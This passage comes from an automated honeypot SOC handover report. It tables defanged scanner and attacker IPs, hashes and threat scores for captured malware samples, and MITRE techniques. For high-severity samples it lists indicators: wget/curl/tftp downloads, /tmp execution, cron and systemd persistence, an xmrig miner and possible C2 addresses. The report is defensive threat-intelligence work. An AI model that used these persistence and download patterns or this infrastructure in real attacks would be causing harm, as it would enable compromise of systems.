| `66.132.186[.]178` | 1 | 2026-11-02 10:33 | 2026-11-02 10:34 | 17s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]192` | 1 | 2026-11-02 15:48 | 2026-11-02 15:48 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]109` | 1 | 2026-11-02 17:31 | 2026-11-02 17:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]113` | 1 | 2026-11-02 10:33 | 2026-11-02 10:33 | 9s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]160` | 1 | 2026-11-02 07:15 | 2026-11-02 07:15 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]47` | 1 | 2026-11-02 15:31 | 2026-11-02 15:31 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]237` | 1 | 2026-11-02 05:31 | 2026-11-02 05:31 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.228.53[.]4` | 1 | 2026-11-02 10:27 | 2026-11-02 10:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-11-02 07:43 | 2026-11-02 07:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-11-02 19:54 | 2026-11-02 19:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.240.223[.]208` | 1 | 2026-11-02 09:08 | 2026-11-02 09:09 | 9s | 0 | `T1592` | 🟢 LOW |
| `66.240.223[.]240` | 1 | 2026-11-02 09:20 | 2026-11-02 09:20 | 10s | 0 | `T1592` | 🟢 LOW |
| `71.6.232[.]27` | 1 | 2026-11-02 20:49 | 2026-11-02 20:49 | 7s | 0 | `T1592` | 🟢 LOW |
| `72.46.87[.]247` | 1 | 2026-11-02 19:05 | 2026-11-02 19:05 | 0s | 1 | `T1110.001` | 🟢 LOW |
| `77.120.57[.]215` | 1 | 2026-11-02 18:54 | 2026-11-02 18:54 | 12s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-02 05:28 | 2026-11-02 05:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-02 09:26 | 2026-11-02 09:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.67.26[.]38` | 1 | 2026-11-02 20:38 | 2026-11-02 20:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]14` | 1 | 2026-11-02 15:41 | 2026-11-02 15:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.39.48[.]166` | 1 | 2026-11-02 20:33 | 2026-11-02 20:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `8.222.128[.]242` | 1 | 2026-11-02 17:43 | 2026-11-02 17:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.94.250[.]103` | 1 | 2026-11-02 09:38 | 2026-11-02 09:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.103.158[.]60` | 1 | 2026-11-02 15:34 | 2026-11-02 15:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]15` | 1 | 2026-11-02 07:28 | 2026-11-02 07:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]66` | 1 | 2026-11-02 07:28 | 2026-11-02 07:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.197.7[.]13` | 1 | 2026-11-02 07:55 | 2026-11-02 07:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]77` | 1 | 2026-11-02 04:19 | 2026-11-02 04:19 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.118.39[.]77` | 1 | 2026-11-02 19:30 | 2026-11-02 19:30 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `95.221.180[.]119` | 1 | 2026-11-02 08:38 | 2026-11-02 08:38 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `185.28.61[.]19` | TR | Ahmet Onur Guney trading as Onur Bilisim Ve Yazilim Hizmetleri | **100** ⚠️ | 15 |
| `45.141.233[.]16` | PL | Razinet Dedicated Servers | **100** ⚠️ | 30 |
| `154.61.65[.]41` | PH | Fil Products Service Television Incorporated | **100** ⚠️ | 2 |
| `31.202.123[.]56` | UA | Maxnet LLC, Kharkiv | **100** ⚠️ | 5 |
| `180.76.188[.]229` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 10 |
| `35.202.9[.]133` | US | Google LLC | **100** ⚠️ | 50 |
| `185.226.197[.]8` | NL | ICG-4-ZEN-AMS | **100** ⚠️ | 50 |
| `172.172.180[.]124` | US | Microsoft Limited | **100** ⚠️ | 50 |
| `58.242.117[.]176` | CN | China Unicom AnHui province network | **100** ⚠️ | 10 |
| `66.132.195[.]160` | US | Censys, Inc. | **100** ⚠️ | 6 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 380 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 314 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 160 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 101 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 93 |

---

## 🔕 False Positive Summary (60 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 20 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 2 |
| AbuseIPDB score 24 below threshold 25 | 4 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 29 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 547 cases |
| Tool 34  | Credential Extractor        | ✅ 14639 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 31 fingerprints |
| Tool 36  | Command Clustering          | ✅ 112 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 276 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 60 filtered (11.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 135 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 38 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 307 priority case(s) shown individually · 159 recon entry/entries in table (18 group(s) consolidating 39 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-02T21:01:41Z_
